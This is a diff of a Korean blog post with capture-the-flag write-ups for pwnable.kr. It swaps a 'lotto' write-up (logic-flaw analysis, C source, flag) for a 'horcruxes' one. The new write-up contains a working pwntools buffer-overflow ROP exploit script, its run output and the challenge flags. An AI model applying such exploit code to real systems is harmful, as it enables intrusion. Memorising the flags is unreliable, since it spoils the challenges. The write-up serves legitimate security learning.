@@ -1,141 +1,80 @@
 ---
 layout: post
-title: "pwnable.kr - lotto"
+title: "pwnable.kr - horcruxes"
 date: 2026-02-19
 categories: pwnable wargame
 ---
-# lotto
-> 엄마! 숙제로 로또 프로그램을 만들었는데 해보실레요?
+# horcruxes
+> 볼드모트가 그의 영혼을 나누어 7개의 호크룩스에 봉인했어요! 모든 호크룩스를 찾아 ROP하세요! <br>
+저자: Jiwon Choi
 
 # 문제 개요
 * pwnable.kr - Toddler's Bottle
-* 2 point
-* files: `flag`, `lotto`, `lotto.c`
+* 7 point
+* files: `horcruxes`, `readme`
 
 # 프로그램 분석
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <fcntl.h>
-
-unsigned char submit[6];
-
-void play(){
-
-        int i;
-        printf("Submit your 6 lotto bytes : ");
-        fflush(stdout);
-
-        int r;
-        r = read(0, submit, 6);
-
-        printf("Lotto Start!\n");
-        //sleep(1);
-
-        // generate lotto numbers
-        int fd = open("/dev/urandom", O_RDONLY);
-        if(fd==-1){
-                printf("error. tell admin\n");
-                exit(-1);
-        }
-        unsigned char lotto[6];
-        if(read(fd, lotto, 6) != 6){
-                printf("error2. tell admin\n");
-                exit(-1);
-        }
-        for(i=0; i<6; i++){
-                lotto[i] = (lotto[i] % 45) + 1;         // 1 ~ 45
-        }
-        close(fd);
-
-        // calculate lotto score
-        int match = 0, j = 0;
-        for(i=0; i<6; i++){
-                for(j=0; j<6; j++){
-                        if(lotto[i] == submit[j]){
-                                match++;
-                        }
-                }
-        }
-
-        // win!
-        if(match == 6){
-                setregid(getegid(), getegid());
-                system("/bin/cat flag");
-        }
-        else{
-                printf("bad luck...\n");
-        }
-
-}
-
-void help(){
-        printf("- nLotto Rule -\n");
-        printf("nlotto is consisted with 6 random natural numbers less than 46\n");
-        printf("your goal is to match lotto numbers as many as you can\n");
-        printf("if you win lottery for *1st place*, you will get reward\n");
-        printf("for more details, follow the link below\n");
-        printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
-        printf("mathematical chance to win this game is known to be 1/8145060.\n");
-}
-
-int main(int argc, char* argv[]){
-
-        // menu
-        unsigned int menu;
-
-        while(1){
-
-                printf("- Select Menu -\n");
-                printf("1. Play Lotto\n");
-                printf("2. Help\n");
-                printf("3. Exit\n");
-
-                scanf("%d", &menu);
-
-                switch(menu){
-                        case 1:
-                                play();
-                                break;
-                        case 2:
-                                help();
-                                break;
-                        case 3:
-                                printf("bye\n");
-                                return 0;
-                        default:
-                                printf("invalid menu\n");
-                                break;
-                }
-        }
-        return 0;
-}
-```
-프로그램 자체는 정상 작동하는 로또 프로그램으로 보이나 같은 자리에 같은 글자가 있는것을 검사하는것이 아닌, 한 글자가 배열 전체에 있는지 검사합니다.
+리버싱 한 결과 총 7개의 호크룩스 함수가 있으며 각 함수는 랜덤값을 출력합니다. 그리고 7개의 모든 호크룩스를 합한 값을 마지막으로 입력하면 flag를 출력합니다  
 
 # 설계 및 시나리오
-위와 같은 논리적 오류가 있으므로 정답 로또에 ascii값 45를 가지는 글자가 1개라도 있고 입력된 로또가 전부 ascii값 45를 가지도록 채워져있다면 6점을 손쉽게 얻을 수있습니다.
+범위 제한 없는 gets함수가 있으므로 버퍼 오버플로우를 사용하여 `A` -> `B` -> `C` -> `D` -> `E` -> `F` -> `G` -> `main`를 순서대로 실행하는 ROP체인을 구성할 수 있습니다.
 
 # 익스플로잇
-랜덤 값중에 45가 있을때까지 계속 돌리면 플래그를 얻을 수있으므로 ------를 계속 넣으면됩니다. pwntool까지 사용하기는 귀찮기 때문에 6바이트만 읽는 것을 이용하여 로또 번호를 입력하는 동시에 메뉴 선택까지 하게 만들어 복사 붙여넣기만으로 작동하게 하였습니다.
+```
+from pwn import *
+import re
+import ctypes
+
+def to_int32(n):
+    return ctypes.c_int32(n).value
+
+r = remote("0", 9032)
+
+r.sendlineafter(b"Select Menu:", b'1')
+
+payload = b'A'* 120 
+payload += p32(0x804129d) + p32(0x80412cf) + p32(0x8041301) + p32(0x8041333) 
+payload += p32(0x8041365) + p32(0x8041397) + p32(0x80413c9) + p32(0x804150b)
+
+r.sendline(payload)
+
+full_output = r.recvuntil(b"Select Menu:") 
+print(full_output.decode(errors='ignore'))
+
+exp_values = re.findall(r'EXP \+([+-]?\d+)', full_output.decode(errors='ignore'))
+
+total_exp = 0
+for val in exp_values:
+    total_exp += int(val)
+
+final_total = to_int32(total_exp)
+
+print(f"Extracted: {exp_values}")
+print(f"Python Sum: {total_exp}")
+print(f"Signed 32bit Sum: {final_total}")
+
+r.sendline(b'1')
+r.sendline(str(final_total).encode())
+
+r.interactive()
+```
 
 # 결과 
 ```
-...(생략)
-Submit your 6 lotto bytes : ------1
-Lotto Start!
-bad luck...
-- Select Menu -
-1. Play Lotto
-2. Help
-3. Exit
-Submit your 6 lotto bytes : ------1
-Lotto Start!
-Sorry_mom_1_Forgot_to_check_duplicates
-- Select Menu -
-1. Play Lotto
-2. Help
-3. Exit
-Submit your 6 lotto bytes :
+horcruxes@ubuntu:/tmp/a$ python3 main.py
+[┤] Opening connection to 0 on port 9032: Tryin[+] Opening connection to 0 on port 9032: Done
+How many EXP did you earned? : You'd better get more experience to kill Voldemort
+You found "Tom Riddle's Diary" (EXP +-1241153607)
+You found "Marvolo Gaunt's Ring" (EXP +-1905003586)
+You found "Helga Hufflepuff's Cup" (EXP +2106776084)
+You found "Salazar Slytherin's Locket" (EXP +1803502743)
+You found "Rowena Ravenclaw's Diadem" (EXP +-1462269776)
+You found "Nagini the Snake" (EXP +1867424878)
+You found "Harry Potter" (EXP +1059253487)
+Select Menu:
+Extracted: ['-1241153607', '-1905003586', '2106776084', '1803502743', '-1462269776', '1867424878', '1059253487']
+Python Sum: 2228530223
+Signed 32bit Sum: -2066437073
+[*] Switching to interactive mode
+How many EXP did you earned? : The_M4gic_sp3l1_is_Avada_Ked4vra
 ```
